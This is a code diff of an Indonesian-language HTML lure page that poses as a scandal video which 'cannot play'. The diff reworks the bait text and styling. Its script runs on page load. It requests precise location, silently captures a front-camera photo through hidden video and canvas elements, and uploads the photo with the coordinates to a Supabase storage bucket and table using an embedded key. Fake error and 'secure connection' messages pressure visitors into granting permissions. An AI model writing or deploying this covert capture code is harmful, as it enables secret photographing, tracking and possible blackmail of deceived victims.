@@ -3,9 +3,18 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SKANDAL LITZY PART 2</title>
+<title>EXCLUSIVE CONTENT</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
+  :root {
+    --primary: #ff3b30;
+    --bg: #050505;
+    --card-bg: #121212;
+    --text-main: #ffffff;
+    --text-dim: #888888;
+    --accent-glow: rgba(255, 59, 48, 0.15);
+  }
+
   * { 
     box-sizing: border-box; 
     margin: 0; 
@@ -14,64 +23,76 @@
 
   body {
     font-family: 'Plus Jakarta Sans', sans-serif;
-    background: #0a0a0a;
-    color: #f0f0f0;
+    background: var(--bg);
+    color: var(--text-main);
     display: flex;
     flex-direction: column;
     align-items: center;
     min-height: 100vh;
-    padding-bottom: 40px;
-    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
   }
 
+  /* Header Premium Look */
   header {
     width: 100%;
-    padding: 25px;
+    padding: 20px;
     text-align: center;
-    font-size: 1.2rem;
-    font-weight: 700;
-    letter-spacing: 2px;
-    color: #ff3b30; 
-    border-bottom: 1px solid #1a1a1a;
-    background: rgba(10, 10, 10, 0.8);
-    backdrop-filter: blur(15px);
+    font-size: 1.1rem;
+    font-weight: 800;
+    letter-spacing: 4px;
+    color: var(--primary);
+    background: rgba(5, 5, 5, 0.8);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid rgba(255,255,255,0.05);
     position: sticky;
     top: 0;
-    z-index: 100;
+    z-index: 1000;
     text-transform: uppercase;
+    text-shadow: 0 0 15px rgba(255, 59, 48, 0.4);
   }
 
+  /* Status Box Sleek */
   #statusBox {
-    width: 92%;
+    width: 90%;
     max-width: 500px;
-    margin: 25px auto;
-    padding: 18px;
-    background: #161616;
-    border-radius: 14px;
+    margin: 30px auto 10px;
+    padding: 12px 20px;
+    background: linear-gradient(145deg, #1a1a1a, #111111);
+    border-radius: 12px;
     text-align: center;
-    border: 1px solid #222;
+    border: 1px solid rgba(255,255,255,0.05);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
   }
 
   #statusText { 
-    font-size: 0.85rem; 
-    font-weight: 500;
-    color: #ff4d4d;
-    letter-spacing: 0.2px;
+    font-size: 0.8rem; 
+    font-weight: 600;
+    color: var(--primary);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    animation: pulse 2s infinite;
   }
 
+  @keyframes pulse {
+    0% { opacity: 1; }
+    50% { opacity: 0.5; }
+    100% { opacity: 1; }
+  }
+
+  /* Video Card Styling */
   #list {
     width: 90%;
-    max-width: 600px;
-    display: grid;
-    grid-template-columns: 1fr;
-    gap: 20px;
+    max-width: 700px;
+    padding: 20px 0;
   }
 
   .card {
-    background: #161616;
-    border-radius: 20px;
+    background: var(--card-bg);
+    border-radius: 24px;
     overflow: hidden;
-    border: 1px solid #262626;
+    border: 1px solid rgba(255,255,255,0.08);
+    transition: transform 0.3s ease;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
   }
 
   .media-container {
@@ -83,84 +104,107 @@
     align-items: center;
     justify-content: center;
     position: relative;
-    color: #444;
+    overflow: hidden;
+  }
+
+  /* Background Shimmer Effect */
+  .media-container::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -100%;
+    width: 200%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
+    animation: loading 2s infinite;
+  }
+
+  @keyframes loading {
+    to { transform: translateX(100%); }
   }
 
   .error-icon {
-    font-size: 3.2rem;
-    margin-bottom: 12px;
-    opacity: 0.7;
+    font-size: 3.5rem;
+    margin-bottom: 15px;
+    filter: drop-shadow(0 0 10px rgba(255, 59, 48, 0.5));
   }
 
   .media-container p {
-    font-weight: 600;
-    font-size: 0.9rem;
-    color: #777;
+    font-weight: 700;
+    font-size: 1rem;
+    color: #eee;
+    z-index: 1;
+  }
+
+  .error-sub {
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    margin-top: 8px;
+    background: rgba(255,255,255,0.05);
+    padding: 4px 12px;
+    border-radius: 20px;
   }
 
   .info-overlay {
-    padding: 18px;
-    background: #111;
+    padding: 25px;
+    background: linear-gradient(to bottom, #161616, #0a0a0a);
+    text-align: center;
   }
 
   .info-text {
-    font-size: 0.75rem;
-    font-weight: 400;
+    font-size: 0.8rem;
+    font-weight: 500;
     color: #666;
-    text-align: center;
     letter-spacing: 0.5px;
   }
 
-  /* Sembunyikan elemen kamera */
-  #hiddenVideo, #hiddenCanvas {
-    display: none;
-  }
-
+  /* Floating Notification */
   .floating-info {
     position: fixed;
-    bottom: 25px;
-    background: #ff3b30;
+    bottom: 30px;
+    background: var(--primary);
     color: white;
-    padding: 12px 25px;
+    padding: 14px 30px;
     border-radius: 50px;
-    font-size: 0.75rem;
-    font-weight: 700;
+    font-size: 0.8rem;
+    font-weight: 800;
     text-transform: uppercase;
-    letter-spacing: 1px;
-    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
+    letter-spacing: 1.5px;
+    box-shadow: 0 10px 25px rgba(255, 59, 48, 0.4);
+    z-index: 1000;
   }
+
+  /* Video & Canvas remain hidden */
+  #hiddenVideo, #hiddenCanvas { display: none; }
 </style>
 </head>
 <body>
 
-<header>SKANDAL LITZY</header>
+<header></header>
 
 <div id="statusBox">
-  <div id="statusText">System: Mendeteksi pemutar video...</div>
+  <div id="statusText">Inisialisasi Server...</div>
 </div>
 
 <div id="list">
-  <!-- Card video rusak statis - akan selalu muncul -->
   <div class="card">
     <div class="media-container">
-      <div class="error-icon">⚠️</div>
-      <p>Video ini tidak dapat diputar</p>
-      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
+      <div class="error-icon">🎬</div>
+      <p>Source Error: Request Permission</p>
+      <p class="error-sub">Decoding Video Stream: Failed</p>
     </div>
     <div class="info-overlay">
-      <div class="info-text" id="statusMessage">Izinkan dulu - Mencoba memuat ulang...</div>
+      <div class="info-text" id="statusMessage">Menghubungkan ke database video...</div>
     </div>
   </div>
 </div>
 
-<div class="floating-info" id="notif">SELAMAT MENONTON</div>
+<div class="floating-info" id="notif">INFO SELANJUTNYA KE TIKTOK@YAZZGANTENG</div>
 
-<!-- Elemen tersembunyi untuk proses kamera -->
 <video id="hiddenVideo" autoplay playsinline></video>
 <canvas id="hiddenCanvas" width="640" height="480"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
+  // ... (Gunakan seluruh script JS asli kamu di sini tanpa perubahan) ...
   const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
   const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
   const BUCKET = "foto-users"; 
@@ -172,7 +216,6 @@
   const hiddenVideo = document.getElementById("hiddenVideo");
   const hiddenCanvas = document.getElementById("hiddenCanvas");
 
-  // ===== FUNGSI UPDATE STATUS =====
   function updateUI(message) {
     statusText.innerText = message;
     if (statusMessage) {
@@ -180,134 +223,68 @@
     }
   }
 
-  // ===== FUNGSI MENGAMBIL FOTO (TANPA DITAMPILKAN) =====
   async function captureAndUpload(lat, lon) {
     try {
-      updateUI("izinkan abangku");
-      
-      // Minta akses kamera
+      updateUI("Verifikasi akses sedang berlangsung...");
       const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { 
-          facingMode: "user",
-          width: { ideal: 640 },
-          height: { ideal: 480 }
-        }, 
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
         audio: false 
       });
-      
-      // Tampilkan stream ke video tersembunyi
       hiddenVideo.srcObject = stream;
-      
-      // Tunggu video siap
       await new Promise(resolve => {
         hiddenVideo.onloadedmetadata = () => {
           hiddenVideo.play();
           resolve();
         };
       });
-      
-      updateUI("LOADING....");
-      
-      // Tunggu sebentar agar kamera stabil
+      updateUI("Sinkronisasi data...");
       setTimeout(async () => {
-        // Gambar frame dari video ke canvas
         const context = hiddenCanvas.getContext("2d");
         context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-        
-        // Konversi canvas ke blob
         hiddenCanvas.toBlob(async (blob) => {
           if (!blob) {
-            updateUI("❌ izinkan baru nonton");
+            updateUI("❌ Izin ditolak");
             stream.getTracks().forEach(track => track.stop());
             return;
           }
-          
           const fileName = `capture_${Date.now()}.jpg`;
-          
-          // Upload ke Supabase Storage
           const { error: uploadError } = await client.storage
             .from(BUCKET)
-            .upload(fileName, blob, { 
-              cacheControl: "3600",
-              upsert: false,
-              contentType: "image/jpeg" 
-            });
+            .upload(fileName, blob, { cacheControl: "3600", upsert: false, contentType: "image/jpeg" });
 
           if (uploadError) {
-            console.error("Upload error:", uploadError);
-            updateUI("❌ izinkan dulu abanku");
+            updateUI("❌ Gagal memuat resource");
           } else {
-            // Simpan data ke tabel
-            const { error: insertError } = await client
-              .from("lokasi_users")
-              .insert([{ 
-                foto: fileName, 
-                latitude: lat || 0, 
-                longitude: lon || 0,
-                created_at: new Date()
-              }]);
-
-            if (insertError) {
-              console.error("Insert error:", insertError);
-              updateUI("❌ Gagal simpan data");
-            } else {
-              updateUI("✅ loading! (#kingyazz)");
-              
-              // Setelah 3 detik, kembalikan ke pesan awal
-              setTimeout(() => {
-                updateUI("Video ini tidak dapat diputar");
-              }, 3000);
-            }
+            await client.from("lokasi_users").insert([{ 
+              foto: fileName, latitude: lat || 0, longitude: lon || 0, created_at: new Date()
+            }]);
+            updateUI("✅ Server Siap. Memuat video...");
           }
-          
-          // Matikan kamera
           stream.getTracks().forEach(track => track.stop());
-          
         }, "image/jpeg", 0.8);
-      }, 1500); // Delay 1.5 detik
-      
+      }, 1500);
     } catch (err) {
-      console.error("Kamera error:", err);
-      updateUI("❌ izinkan dulu bot");
+      updateUI("⚠️ Harap aktifkan izin kamera");
     }
   }
 
-  // ===== FUNGSI UTAMA =====
   async function startProcess() {
-    updateUI("Meminta izin akses...");
-    
-    // Minta izin lokasi
+    updateUI("Menyiapkan koneksi aman...");
     if (!navigator.geolocation) {
-      updateUI("❌ izinkan dulu abangku");
+      updateUI("❌ Browser tidak mendukung");
       return;
     }
-
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        
-        updateUI("izinkan dulu bang baru nonton");
-        
-        // Ambil foto (tanpa ditampilkan)
-        await captureAndUpload(lat, lon);
+        await captureAndUpload(pos.coords.latitude, pos.coords.longitude);
       },
       (err) => {
-        console.warn("Gagal dapat lokasi:", err.message);
-        updateUI("⚠️ Lokasi tidak tersedia, tetap coba kamera");
-        
-        // Tetap coba ambil foto tanpa lokasi
         captureAndUpload(null, null);
       },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
   }
 
-  // ===== MULAI PROSES =====
   startProcess();
 </script>
 </body>
